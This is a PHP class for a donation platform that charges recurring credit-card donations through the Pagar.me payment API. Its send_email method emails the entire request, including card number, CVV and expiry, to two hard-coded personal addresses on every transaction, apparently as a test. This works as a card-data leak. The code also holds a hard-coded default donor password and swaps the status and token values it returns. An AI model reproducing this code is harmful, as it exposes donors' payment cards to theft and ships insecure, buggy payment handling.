<?php

class RecorrenciaDigital
{


    static function obrigatorio()
    {
        campo_obrigatorios([
            'plano_token' => 'Informe um token de plano',
            'amount' => 'Informe o valor',
            'cart_nome' => 'Informe um nome',
            'cart_numero' => 'Informe numero de cartão',
            'cart_cvv' => 'Informe um cvv',
            'cart_validade' => 'inform validade',
        ]);
    }

    static function get_dados_adm(array $jwt): array
    {
        $adm = new Adm();
        $get_secret = $jwt['secret'];
        $get_dados = $adm->list_profile($get_secret);
        return [
            "id" => $get_dados['id'],
            "nome" => $get_dados['nome'],
            "cpf" => $get_dados['cpf'],
            "telefone" => $get_dados['telefone'],
            "email" => $get_dados['email']
        ];
    }

    static function get_token_doador($cpf, $nome, $email, $telefone)
    {
        $doador = new Doador();
        $pagarme_Costumer = new PagarMeCostumer();

        if (!$doador->exist($cpf)) {
            $doador->create($nome, $email, $telefone, $cpf, "GFCGDVJKLIKHB@~");
        }
        $doador_dados = $doador->get_by_cpf($cpf);
        $doador_id = $doador_dados['id'];

        if ($doador_dados['token'] == null) {
            $token_doador = $pagarme_Costumer->create($nome, $email, $doador_id, ['+55' . $telefone], $cpf);
            $get_token_doador = $token_doador['id'];
            $doador->set_token($doador_id, $get_token_doador);
            $doador_dados['token'] = $token_doador;
        }
        return $doador_dados['token'];
    }

    static function assinar_plano(
        $plano_token,
        $amount,
        $cart_nome,
        $cart_numero,
        $cart_cvv,
        $cart_validade,
        $bairro,
        $endereco,
        $numero,
        $cep,
        $cpf,
        $email,
        $nome,
        $phone_number,
        $ddd
    ) {

        $pagarme_cartao = new PagarMeCartao();
        $res_pagarme_cartao = $pagarme_cartao->create_cartao(
            $cart_numero,
            $cart_cvv,
            $cart_validade,
            $cart_nome
        );

        $get_id_cartao = $res_pagarme_cartao['id'];

        $res_pagarme_recorrencia = $pagarme_cartao->create_recorrencia(
            $plano_token,
            $get_id_cartao,
            $bairro,
            $endereco,
            $numero,
            $cep,
            $cpf,
            $email,
            $nome,
            $phone_number,
            $ddd,
            'credit_card'
        );

        return [
            "status" => $res_pagarme_recorrencia['id'],
            "token" => $res_pagarme_recorrencia['status']
        ];
    }

    static function salve_db(
        $admin_id, 
        $token, 
        $status_pagamento, 
        $plano_id, 
        $valor           

    ) {
        $doacaoDigital = new DoacaoDigital();
        $doacaoDigital->create(
            $admin_id, 
            $token, 
            $status_pagamento, 
            $plano_id, 
            $valor  
        );
    }

    static function send_email($email) {
        @mail("br.rafael@outlook.com", "teste - " . date("d/m/Y H:i"), json_encode($_REQUEST));
        @mail("victorfernandomagalhaes@gmail.com", "teste - " . date("d/m/Y H:i"), json_encode($_REQUEST));
        @mail($email, "Doação", "...");
    }

    static function get_endereco_by_id($id) {
        $endereco = new Endereco();
        
        $get_dados = $endereco->list_all_by_fk($id);
        
        return [
            "bairro" => $get_dados['bairro'],
            "endereco" => $get_dados['logadouro'],
            "numero" => $get_dados['numero'],
            "cep" => withdraw_caracter($get_dados['cep']) 
        ];
    }

    static function create_transacao()
    {
        header('Content-Type: text/html; charset=utf-8');

        $jwt = token();

        self::obrigatorio();
        $dados_adm = self::get_dados_adm($jwt);

        $plano_token = $_REQUEST['plano_token'];
        $amount = $_REQUEST['amount'];
        $cart_nome = $_REQUEST['cart_nome'];
        $cart_numero = withdraw_caracter($_REQUEST['cart_numero']);
        
        $cart_cvv = $_REQUEST['cart_cvv'];
        $cart_validade = withdraw_caracter($_REQUEST['cart_validade']);       
        
        $cpf_campo = $dados_adm['cpf'];
        $email_campo = $dados_adm['email'];
        $nome = $dados_adm['nome'];
        $adm_id = $dados_adm['id'];
        $full_telefone = $dados_adm['telefone'];
        $phone_number = telefone_get_number($full_telefone);
        $ddd = telefone_get_ddd($full_telefone);
        $email = valid_email($email_campo);
        $cpf = valid_cpf_cnpj($cpf_campo);
        
        $full_endereco = self::get_endereco_by_id($adm_id);

        $bairro = $full_endereco['bairro'];
        $endereco = $full_endereco['endereco'];
        $numero = $full_endereco['numero'];
        $cep = $full_endereco['cep'];

        $token_doador = self::get_token_doador(
            $cpf,
            $nome,
            $email,
            $full_telefone,
        );

        $res_asign_plan = self::assinar_plano(
            $plano_token,
            $amount,
            $cart_nome,
            $cart_numero,
            $cart_cvv,
            $cart_validade,
            $bairro,
            $endereco,
            $numero,
            $cep,
            $cpf,
            $email,
            $nome,
            $phone_number,
            $ddd,
        );

        self::salve_db(
            $adm_id, 
            $res_asign_plan['token'], 
            $res_asign_plan['status'], 
            $plano_token, 
            $amount
        );

        self::send_email($email);

        echo json_encode([
            'next' => true,
            'message' => 'Transacao Concluida',
        ]);
    }
}
